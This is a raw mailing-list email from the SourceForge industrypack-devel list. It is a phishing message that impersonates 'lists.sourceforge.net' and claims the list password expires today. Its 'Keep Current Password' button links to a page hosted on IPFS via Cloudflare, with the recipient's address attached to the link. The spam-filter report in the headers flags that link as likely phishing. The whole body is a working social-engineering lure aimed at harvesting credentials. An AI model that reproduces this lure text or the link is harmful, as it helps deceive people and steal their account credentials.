Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id ABA1F8BF927
	for <lists+industrypack-devel@lfdr.de>; Wed,  8 May 2024 11:00:10 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1s4d9k-0001h5-9B
	for lists+industrypack-devel@lfdr.de;
	Wed, 08 May 2024 09:00:09 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <sara@icevolcano.com>) id 1s4d9g-0001gP-3n
 for industrypack-devel@lists.sourceforge.net;
 Wed, 08 May 2024 09:00:05 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=8C/bWrwhN26IvhtZER+KNqPJ56GwkvrBe7Ek05LnFLg=; b=m0S2PqyBk1eMBzHlIVBmo5Dyva
 59PGJfXj18TE8A2wKVFF7u/tDd4ouW77bk27qbyi0T/XgMxtyrZkVqVScS3n5fxnPVqv6o/Nv/blk
 UjighNHU/K0KuoqLH58bgd63yiM9U6+cA7kiipuYD5efl43iMZCfWVgh5Ah82WLRbQSk=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=8C/bWrwhN26IvhtZER+KNqPJ56GwkvrBe7Ek05LnFLg=; b=I
 58cUUzglxVPJgqkyKdqrl/kAOKwolwc82R7cHm513g0reG1H+9pb94VwnvG+tGX+2lJJyd08G7+7F
 Rg7Us40n4bgpZ+SiEoIW28auM3AT9pal8qg6v3XumVCg0cEXLGJ3a/LX1Vz49PM9/y+AxCVpYjQZW
 yuspLaO9ZZZBuNyM=;
Received: from aboon.icevolcano.com ([194.169.172.99])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1s4d9g-0007Ij-Vv for industrypack-devel@lists.sourceforge.net;
 Wed, 08 May 2024 09:00:05 +0000
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=icevolcano.com; 
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
 i=sara@icevolcano.com; bh=XJBnkWZI3YPexPD4U3emNzAayko=;
 b=UKUWPcrBvjd33uzVxMNi2EcpOb7SFmYOywNgQHornX2UU1oF1xOsb9tOPUsF7G7G5ULHwzwKp8Mb
 vaGI7KsMIvV+usATHIIT58FxY+RC1ftBrR3Ncqxg/YJsppYSgNBznI8h7dxULrAShlucmbDreb90
 MgXtL47K9OK4WrgJz2CEh08sFzb8IUb8horKgNxEv/Snviw9jnYrhbRBrqPhv7x3IOGQDHjtbBep
 z1N00oYeDieoHcqfWqOOxYm6axNKWTpihnSFsyDog7m8eAbU4NSIHlHLUlsO+rtuHLC/RU8dosv4
 nXxFRW52v7hyihx8/hDjJ5PJCbtR9JC+pmSPDg==
DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=icevolcano.com;
 b=LaKwrtkTJAU1z3WG9UAxCXxv0FNFReESMv73+OAqOqPUtiurv/plo0+TDNojEIceDqDh0UooOJye
 ayud10mULGJKUzOUQBo7DagayrRa6AWV7/RuYmXnKc66bexkrN8tgODO6bJoYL8v3rlHivE+S381
 hkYOpbi+00DTKQNf4YR2UwxJuIK9sju3/aUlbbV0fFWv+uudscbeCs6HUpzv1yfn8QVDq1Iyjmt2
 bpKlwvsPdRGWxYE8ti5uy9uuEI+mA5igQTbZYL0jnXqHp7MvQMiVDnOfKh/rYSktys3H4WE7lL0a
 QuopvCeY8a713vRyLySAXmAn7HldpW5v9pojfA==;
From: lists.sourceforge.net <sara@icevolcano.com>
To: industrypack-devel@lists.sourceforge.net
Date: 8 May 2024 01:59:47 -0700
Message-ID: <20240508015947.2BF30FB397E10A54@icevolcano.com>
MIME-Version: 1.0
X-Spam-Score: 3.8 (+++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  lists.sourceforge.net Notification Update Hi,
 industrypack-devel, 
 Your password for industrypack-devel@lists.sourceforge.net expires today
 5/8/2024 1:59:47 a.m. Follow below to keep your current password and update
 your account. 
 Content analysis details:   (3.8 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: dweb.link]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.0 RCVD_IN_DNSWL_BLOCKED  RBL: ADMINISTRATOR NOTICE: The query to
 DNSWL was blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [194.169.172.99 listed in list.dnswl.org]
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
 identical to background
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 0.8 PDS_FROM_NAME_TO_DOMAIN From:name looks like To:domain
 2.5 URI_CLOUDFLAREIPFS     References Interplanetary File System PtP
 content via CloudFlare, likely phishing
 0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
 Colors in HTML
 0.0 PDS_FRNOM_TODOM_DBL_URL From Name to domain, double URL
 0.6 PDS_FRNOM_TODOM_NAKED_TO Naked to From name equals to Domain
X-Headers-End: 1s4d9g-0007Ij-Vv
Subject: [Industrypack-devel] Password Expiration Notification today
 5/8/2024 1:59:47 a.m.
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============0634960289513892560=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============0634960289513892560==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body style=3D"margin: 0.4em;"><p>

<br></p>
<table width=3D"640" style=3D'text-align: left; color: rgb(68, 68, 68); tex=
t-transform: none; letter-spacing: normal; font-family: "segoe ui semilight=
","segoe ui",verdana,sans-serif,serif,emojifont; font-size: 18px; font-styl=
e: normal; font-weight: 400; word-spacing: 0px; white-space: normal; border=
-collapse: collapse; box-sizing: border-box; background-color: rgb(255, 255=
, 255); font-variant-ligatures: normal; font-variant-caps: normal; text-dec=
oration-style: initial; text-decoration-color:=20
initial;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"=
box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td width=3D=
"582" align=3D"right" valign=3D"bottom" style=3D"margin: 0px; padding: 22px=
 0px; color: rgb(255, 255, 255); font-family: arial; border-collapse: colla=
pse; box-sizing: border-box;" bgcolor=3D"#0072c6"><font style=3D"box-sizing=
: border-box;"><span style=3D"font-family: arial,helvetica,sans-serif,sans-=
serif; font-size: 26px; box-sizing: border-box;">
<a style=3D"color: rgb(34, 34, 34); text-decoration: underline; box-sizing:=
 border-box; background-color: transparent;" rel=3D"noreferrer">lists.sourc=
eforge.net</a><span style=3D"box-sizing: border-box;">&nbsp;</span>&nbsp;No=
tification Update&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></font><=
/td>
<td width=3D"28" style=3D"margin: 0px; padding: 0px; border-collapse: colla=
pse; box-sizing: border-box;" bgcolor=3D"#0072c6"><br style=3D"box-sizing: =
border-box;"></td><td width=3D"1" style=3D"margin: 0px; padding: 0px; borde=
r-collapse: collapse; box-sizing: border-box;" bgcolor=3D"#e3e3e3"><br styl=
e=3D"box-sizing: border-box;"></td></tr></tbody></table>
<table width=3D"640" style=3D'text-align: left; color: rgb(68, 68, 68); tex=
t-transform: none; letter-spacing: normal; font-family: "segoe ui semilight=
","segoe ui",verdana,sans-serif,serif,emojifont; font-size: 18px; font-styl=
e: normal; font-weight: 400; word-spacing: 0px; white-space: normal; border=
-collapse: collapse; box-sizing: border-box; background-color: rgb(255, 255=
, 255); font-variant-ligatures: normal; font-variant-caps: normal; text-dec=
oration-style: initial; text-decoration-color:=20
initial;' border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"=
box-sizing: border-box;"><tr style=3D"box-sizing: border-box;"><td width=3D=
"1" style=3D"margin: 0px; padding: 0px; border-bottom-color: rgb(227, 227, =
227); border-bottom-width: 1px; border-bottom-style: solid; border-collapse=
: collapse; box-sizing: border-box;" bgcolor=3D"#e3e3e3"><br style=3D"box-s=
izing: border-box;"></td>
<td width=3D"28" style=3D"margin: 0px; padding: 0px; border-bottom-color: r=
gb(227, 227, 227); border-bottom-width: 1px; border-bottom-style: solid; bo=
rder-collapse: collapse; box-sizing: border-box;" bgcolor=3D"#ffffff"><br s=
tyle=3D"box-sizing: border-box;"></td><td width=3D"582" valign=3D"top" styl=
e=3D"margin: 0px; padding: 20px 0px 30px; border-bottom-color: rgb(227, 227=
, 227); border-bottom-width: 1px; border-bottom-style: solid; border-collap=
se: collapse; box-sizing: border-box;" bgcolor=3D"#ffffff">
<font color=3D"#000000" style=3D"box-sizing: border-box;">Hi, industrypack-=
devel</font><font color=3D"#000000" style=3D"box-sizing: border-box;"><b st=
yle=3D"font-weight: bolder; box-sizing: border-box;">,<br style=3D"box-sizi=
ng: border-box;"><br style=3D"box-sizing: border-box;"></b>Your password fo=
r<span> </span></font>industrypack-devel@lists.sourceforge.net<font color=
=3D"#000000" style=3D"box-sizing: border-box;"><span> </span>expires today =
5/8/2024 1:59:47 a.m.<br style=3D"box-sizing: border-box;">
Follow below to keep your current password and update your account.</font><=
font color=3D"#3d85c6" style=3D"box-sizing: border-box;"><br style=3D"box-s=
izing: border-box;"></font><span style=3D"font-size: small; box-sizing: bor=
der-box;"><br style=3D"box-sizing: border-box;"></span><div style=3D"font-f=
amily: arial,sans-serif,serif,emojifont; font-size: 12px; box-sizing: borde=
r-box;">
<a style=3D'margin: 0px; padding: 14px 7px; border-radius: 4px; width: 210p=
x; text-align: center; color: white; font-family: "open sans","helvetica ne=
ue",arial; font-size: 15px; text-decoration: none; display: block; max-widt=
h: 210px; box-sizing: border-box; background-color: rgb(0, 126, 230);' href=
=3D"https://cloudflare-ipfs.com/ipfs/bafybeid5rlj5lsft4cas2mkymaxrwpl7y3dpu=
xeu7bvozeaxzwr25w4r5y/ws13duijk.html#industrypack-devel@lists.sourceforge.n=
et" target=3D"_blank" rel=3D"noreferrer"=20
data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://bafybeictxen=
3kka4hjuawfydq4bwvpso3hwnjbp4cvot224p3u5ortvurm.ipfs.dweb.link/%23%5B%5B-Em=
ail-%5D%5D&amp;source=3Dgmail&amp;ust=3D1705989904772000&amp;usg=3DAOvVaw3A=
Kr2PAu4gJWfhg2f-N6HP">Keep Current Password</a><div style=3D"color: rgb(0, =
0, 0); box-sizing: border-box;">&nbsp;</div><div style=3D"color: rgb(0, 0, =
0); box-sizing: border-box;"><br style=3D"box-sizing: border-box;"></div></=
div>
<table style=3D"border-collapse: collapse; box-sizing: border-box;" border=
=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: bord=
er-box;"><tr style=3D"box-sizing: border-box;"><td width=3D"100%" style=3D'=
margin: 0px; padding: 20px 0px 0px; color: rgb(61, 61, 61); font-family: "s=
egoe ui",arial,sans-serif; font-size: 10px; border-top-color: rgb(227, 227,=
 227); border-top-width: 1px; border-top-style: solid; border-collapse: col=
lapse; box-sizing: border-box;'>
<table style=3D"width: 509px; font-family: roboto,robotodraft,helvetica,ari=
al,sans-serif; border-collapse: collapse; box-sizing: border-box;" border=
=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: bord=
er-box;"><tr style=3D'color: rgb(64, 64, 64); line-height: 26px; font-famil=
y: "open sans",helveticaneue-light,"helvetica neue light","helvetica neue",=
helvetica,arial,"lucida grande",sans-serif; font-size: 16px; box-sizing: bo=
rder-box;'><td style=3D"margin: 0px; box-sizing: border-box;">
<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
<font color=3D"#0e66f1" style=3D"box-sizing: border-box;"><b style=3D"font-=
weight: bolder; box-sizing: border-box;"><a style=3D"color: rgb(34, 34, 34)=
; text-decoration: none; box-sizing: border-box; background-color: transpar=
ent;" rel=3D"noreferrer">lists.sourceforge.net</a></b></font><font color=3D=
"#000000" style=3D"box-sizing: border-box;">&nbsp;</font><font color=3D"#00=
0000" style=3D"box-sizing: border-box;">Notification For Your Passcode.</fo=
nt>
</p></td></tr></tbody></table></td></tr></tbody></table></td></tr></tbody><=
/table><p>

<br></p></body></html>


--===============0634960289513892560==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============0634960289513892560==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============0634960289513892560==--
